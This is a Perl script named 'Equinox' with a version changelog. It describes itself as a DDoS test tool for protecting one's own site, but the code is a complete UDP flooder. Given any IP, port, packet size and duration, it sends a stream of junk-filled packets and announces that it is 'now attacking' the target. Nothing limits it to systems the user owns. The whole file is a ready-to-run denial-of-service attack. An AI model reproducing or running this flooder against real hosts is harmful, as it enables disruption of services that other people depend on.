#!/user/bin/perl START SCRIPT
# EQUINOX IS A DDOS TEST TOOL FOR YOUR SITE/PROGRAM'S PROTECTION

# ----------------------------# + NotDos created.
#  ver. 1.0.1                 # + Basic DDoS methods added.
#  December 21, 2012          # + Program enters ver. 1.0.1.
#-----------------------------# 

# ----------------------------# + Name changed to 'equinox'. Legacy of NotDos, R.I.P.
#  ver. 1.0.2                 # + Added Cocoa GUI for new executable.
#  February 26, 2013          # + Program enters ver. 1.0.2
#-----------------------------# + New packet(s) to be sent.

# ----------------------------# + Code cleaned up.
#  ver. 1.0.3                 # + Comments clarified.
#  May 23, 2013               # + Program enters ver. 1.0.3
#-----------------------------# + Project undergoing work soon.

use Socket;
use strict;

if ($#ARGV != 3) {
  print "equinox <ip> <port> <size> <time>\n\n";
  print " port=0: use random ports\n";
  print " size=0: use random size between 64 and 1024\n";
  print " time=0: continuous flood\n";
  exit(1);
}

my ($ip, $port, $size, $time) = @ARGV;
my ($iaddr, $endtime, $psize, $pport);

$iaddr = inet_aton("$ip") or die "Cannot resolve hostname $ip\n.";
$endtime = time() + ($time ? $time : 1000000);

socket (flood, PF_INET, SOCK_DGRAM, 17);

print "Equinox - now attacking: $ip" . ($port ? $port : " random") . " port with " .
($psize ? "$size-byte" : "random size ") . "packets" .
($time ? " for $time seconds" : "") . "\n";
print "Break with Ctrl-C\n" unless $time;

for (;time() <= $endtime;) {
	$psize = $size ? $size : int (rand(2000-64)+64);
	$pport = $port ? $port : int (rand(65500))+1;
	
	send (flood, pack("a$psize", "saf3e368wumu7repa4uxa2rucHap
	hubeGamu9R3373af8Us3eTHUgepRAfAS2c6CHAyegURepUbre94wRAwruS2
	uhU8UXasp7spasw7sw8h7wapr5spabekumu8ast8StRadusASacu6a6e5efrAze
	WucH5cumuswaraca7hAbrewrecujetrafefadrawruW4ayAjU37sPUseBr4cRuPhac
	rUtrf0azrrQlLd1xdSjjtdwXfjyXArkExrVxVlulxssmr0u0lRscLAqjkZB43ajPRmA
	H4JQ6T1SOZPFmndbEi4IUOIuUmPCXI044f73uGIeJHs8lh36KpJausXqykL2idPx1j12
	0Rra2DI1kmGgde5LI4TJMuQvrotBR3Fli0g1uwt74ALKfRzHYZJR0wkqNncUY178LcbTF
	tx5n7MF4zX3P4Z3mUVkAebkXqDv6EETKTNBes9kW2QBEBLeKcBH4cUAQ8Y30mdGozVRNJq
	3wtDMmgtzCibqXEEp3cZATTOMqIDxn3t5HYdspEofPneXpPTUE0TBN8oRAp4DjSlhfDAVmf
	NgbdSbTHWT7Y7gVi6kgrNXKCM64V4kOGvesVr0SZU3k83r6qAr3w4d26kurU9eBRa53cEtRa
	QaCHEvacu4PETRaf3yepHAk9FAgU2at8GEMEZAwUjaDesTufu2r3DaPhedR7quCru7reketc8
	atacAStuGeFruNuTHaWuspabr6drARa4r4cApRewuFRaD3qAXAsPeMAChudRUWxuq73R5dra8ep
	re4tasp8craq677wru5asuq3tradede8rethuSwAfespastuduypUt2fudra5utanewrat83rucr
	uyuje6aphuprUWawrawr4tha922HeSpU8acacu5hastuprecevasteberepagas6ejuje2heswugu
	kerebrajeVeswerajAdagecah3phE9EsutaFrU6erathu2u6utraseCrEjehaChuphEchepeswutre
	zu86pret6afasaf3e368wumu7repa4uxa2rucHap              
	hubeGamu9R3373af8Us3eTHUgepRAfAS2c6CHAyegURepUbre94wRAwruS2
	uhU8UXasp7spasw7sw8h7wapr5spabekumu8ast8StRadusASacu6a6e5efrAze
	WucH5cumuswaraca7hAbrewrecujetrafefadrawruW4ayAjU37sPUseBr4cRuPhac
	rUtrf0azrrQlLd1xdSjjtdwXfjyXArkExrVxVlulxssmr0u0lRscLAqjkZB43ajPRmA
	H4JQ6T1SOZPFmndbEi4IUOIuUmPCXI044f73uGIeJHs8lh36KpJausXqykL2idPx1j12
	0Rra2DI1kmGgde5LI4TJMuQvrotBR3Fli0g1uwt74ALKfRzHYZJR0wkqNncUY178LcbTF
	tx5n7MF4zX3P4Z3mUVkAebkXqDv6EETKTNBes9kW2QBEBLeKcBH4cUAQ8Y30mdGozVRNJq
	3wtDMmgtzCibqXEEp3cZATTOMqIDxn3t5HYdspEofPneXpPTUE0TBN8oRAp4DjSlhfDAVmf
	NgbdSbTHWT7Y7gVi6kgrNXKCM64V4kOGvesVr0SZU3k83r6qAr3w4d26kurU9eBRa53cEtRa
	QaCHEvacu4PETRaf3yepHAk9FAgU2at8GEMEZAwUjaDesTufu2r3DaPhedR7quCru7reketc8
	atacAStuGeFruNuTHaWuspabr6drARa4r4cApRewuFRaD3qAXAsPeMAChudRUWxuq73R5dra8ep
	re4tasp8craq677wru5asuq3tradede8rethuSwAfespastuduypUt2fudra5utanewrat83rucr
	uyuje6aphuprUWawrawr4tha922HeSpU8acacu5hastuprecevasteberepagas6ejuje2heswugu
	kerebrajeVeswerajAdagecah3phE9EsutaFrU6erathu2u6utraseCrEjehaChuphEchepeswutre
	zu86pret6afa"), 0, pack_sockaddr_in($pport, $iaddr));
}

#1/usr/bin/perl END SCRIPT